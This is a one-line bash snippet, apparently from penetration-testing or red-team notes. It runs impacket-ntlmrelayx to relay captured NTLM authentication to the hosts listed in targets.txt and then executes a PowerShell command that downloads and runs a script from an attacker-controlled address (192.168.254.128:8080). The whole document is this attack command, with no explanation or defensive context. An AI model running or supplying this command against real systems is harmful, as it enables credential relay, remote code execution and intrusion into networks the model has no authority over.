
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell.IEX(New-Object Net.WebClient).downloadString('http://192.168.254.128:8080/PS.ps1')" 
```